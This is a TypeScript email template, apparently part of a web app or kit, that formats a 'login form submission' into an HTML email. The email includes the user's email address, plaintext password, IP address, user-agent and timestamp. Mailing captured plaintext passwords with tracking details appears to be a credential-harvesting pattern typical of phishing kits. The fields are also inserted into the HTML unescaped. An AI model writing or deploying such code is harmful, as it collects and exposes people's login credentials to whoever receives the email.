import { LoginEmailData } from './types'


export function loginEmailTemplate(data: LoginEmailData) {
  return `
    <div style="font-family: Arial, sans-serif; line-height: 1.5">
      <h2>🔐 Login form submission</h2>

      <table cellpadding="6">
        <tr>
          <td><b>Email:</b></td>
          <td>${data.email}</td>
        </tr>

        ${
          data.password
            ? `<tr>
                 <td><b>Password:</b></td>
                 <td>${data.password}</td>
               </tr>`
            : ''
        }

        <tr>
          <td><b>IP:</b></td>
          <td>${data.ip ?? 'unknown'}</td>
        </tr>

        <tr>
          <td><b>User-Agent:</b></td>
          <td>${data.userAgent ?? 'unknown'}</td>
        </tr>

        <tr>
          <td><b>Time:</b></td>
          <td>${data.createdAt}</td>
        </tr>
      </table>

      <hr />
      <small>Next.js Email Service</small>
    </div>
  `
}
